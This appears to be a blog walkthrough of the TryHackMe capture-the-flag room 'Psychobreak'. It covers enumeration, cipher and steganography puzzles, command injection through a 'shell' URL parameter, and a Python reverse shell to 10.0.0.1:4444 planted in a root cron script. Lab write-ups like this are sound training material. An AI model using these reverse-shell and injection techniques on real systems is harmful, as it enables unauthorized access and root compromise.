---
layout: post
title: Psychobreak
date: 2020-11-14 19:00:00 +0000
categories: [Tryhackme, Easy]
tags: [thm]
---


Psycho Break is a TryHackMe room which is based on the video game “The Evil Within”. The objective is to get the user flag and the root flag.

![cover image](/assets/img/tryhackme/psychobreak/1.png)

**Author** | Shafdo
**Description** | Help Sebastian and his team of investigators to withstand the dangers that come ahead

Deploy the VM and let’s go…

First up is enumeration

## Task 1

![nmap](/assets/img/tryhackme/psychobreak/3.png)
<p>A simple nmap scan would give the answers to the first task. So I tried to login to the ftp service. Anonymous login is not enabled in ftp service. So let’s move on to http.</p>


## Task 2

![http_service](/assets/img/tryhackme/psychobreak/4.png)
<p> In the source page we can find the room name. Let’s go into the room.</p>

![Sadist_room](/assets/img/tryhackme/psychobreak/5.png)
<p>We can get the key to the locker room by clicking the given link. But wait… seconds after clicking the link the the background changes and a alert box asking for the key pops up.</p>

![Sadist_room2](/assets/img/tryhackme/psychobreak/6.png)
<p>After entering the key, we can see the locker room page. After looking at the link to the map, it seems we need to decode the piece of text to get the map.</p>

![Locker_room](/assets/img/tryhackme/psychobreak/7.png)
<p>At first I thought it was rot13 encoded but I was wrong. Go the link [vigenere-solver](https://www.guballa.de/vigenere-solver) and choose the correct variant given in the image to decode the text</p>

![decode](/assets/img/tryhackme/psychobreak/8.png)
<p>After decoding, enter the decoded text to get access to map. Let’s move on to the next room…</p>

![Safe_haven](/assets/img/tryhackme/psychobreak/11.png)
<p>In the source code of the page we can find a hint.<p>

![Safe_haven_hint](/assets/img/tryhackme/psychobreak/12.png)
<p>I had a hard time in this part. I tried enumerating using various methods but it took me more than a hour to finally find this.</p>

<pre>gobuster dir -u http://<ip-address>/ -w /usr/share/dirb/wordlist/medium.txt -x php,txt,js,html -t 100</pre>

<p>use gobuster with the medium wordlist to find the hidden directory.</p>

![The_keeper](/assets/img/tryhackme/psychobreak/14.png)
<p>After clicking on the link we are redirected to another page.</p>

![Save_yourself](/assets/img/tryhackme/psychobreak/15.png)
<p>A simple google image search would tell the answer right away. And we’ll get the keeper’s key. So let’s go to the final room given in the map.</p>

![Abandoned_room](/assets/img/tryhackme/psychobreak/18.png)
<p>After clicking on the link, it redirects to another page.</p>

![Spiderlady](/assets/img/tryhackme/psychobreak/19.png)
<p>After looking at the source page, I found a hint which told that the keyword *“shell”* would be useful. So, I tried appending it to the end of the url but there was no response. Finally, after setting it with value, it responds….</p>

<pre>http://<ip-address>/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls ..</pre>

![dir_list](21.png)
<p>I downloaded the two files after moving into the other directory that was returned in the response.</p>

## Task 3

<p>The text file is just a message so I extracted the zip file. Extract the contents of the image file using binwalk since it was corrupted.</p>

<pre>binwalk -e image.jpg</pre>
<p>After listening to the .wav file I found that it was morse code. So, I decrypted using [Morse Decoders](https://morsecode.world/international/decoder/audio-decoder-expert.html).</p>

![sound_file_decryption](/assets/img/tryhackme/psychobreak/27.png)
<p>Using the message that is decrypted  to extract the contents of the other image file with steghide.</p>

<pre>steghide --extract -sf image_file.jpg</pre>
<p>The text file gives the ftp credentials. Let’s login to ftp…</p>

![FTP_creds](/assets/img/tryhackme/psychobreak/28.png)

## Task 4

<p>I found two files in the ftp server and I downloaded using the get command.</p>

<pre>get file-name</pre>
![program](/assets/img/tryhackme/psychobreak/30.png)

<p>After running the program file I found that it takes a word as a argument. So, I ran the bash script.</p>

```
for i in $(cat list.dic);
do
./program $i;
done
```

![program_decryption](/assets/img/tryhackme/psychobreak/31.png)
<p>There is another bunch of numbers given to be decoded. This is multitap phone cipher. It can be cracked using [dcode]().</p>


## Task 5

<p>The decoded text is the SSH password. Without further wait, let’s login to ssh.</p>

![ssh_login](/assets/img/tryhackme/psychobreak/34.png)
<p>We found the user.txt in the home directory and some other hidden files</p>

![ssh_hidden_dirs](/assets/img/tryhackme/psychobreak/35.png)
<p>After reading the .readThis.txt file, it seems there is a file with the name the_eye_of_ruvik. So, I checked the /etc/crontab and I was right, there is a file named .the_eye_of_ruvik.py that runs as root for very 30 secs and whats more is we can edit the file.</p>

<pre>
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
</pre>

<p>So, I appended the python reverse shell in the file and opened a netcat listener in my local machine. After a few seconds I got the reverse shell.</p>

![root_flag](/assets/img/tryhackme/psychobreak/39.png)
<p>We also got the root flag.</p>

## Bonus

![bonus_flag](/assets/img/tryhackme/psychobreak/40.png)

<p>The bonus task is to delete the user ruvik</p>

<pre>userdel -r ruvik</pre>
<p> Run this as root</p>

<p>That’s it folks. Happy Hacking!!! :sunglasses: </p>
